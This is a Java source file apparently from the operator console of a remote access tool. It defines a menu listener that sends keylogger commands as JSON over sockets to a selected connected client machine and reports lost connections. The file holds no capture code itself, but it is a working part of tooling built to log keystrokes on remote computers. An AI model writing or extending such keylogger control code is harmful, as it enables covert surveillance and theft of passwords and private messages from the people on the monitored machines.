package GUI.TableUtils.KeyLogger;

import Connections.ClientErrorHandler;
import Connections.Streams;
import GUI.TableUtils.Configuration.GetSYS;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;

public class KeyLoggerMenuListener implements ActionListener {
    private final ConcurrentHashMap<Socket, Streams> map;
    private final JTable table;
    private final KeyloggerEvents event;

    public KeyLoggerMenuListener(JTable table, ConcurrentHashMap<Socket, Streams> map, KeyloggerEvents event) {
        this.map = map;
        this.table = table;
        this.event = event;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Streams stream = GetSYS.getStream(map, table);
        assert stream != null;
        stream.getExecutor().submit(() -> {
            try {
                stream.sendAndReadJSON(event);
            } catch (IOException ex) {
                new ClientErrorHandler("Unable to manage keylogger, connection lost with client",
                        stream.getClientSocket());
            }
        });
    }
}

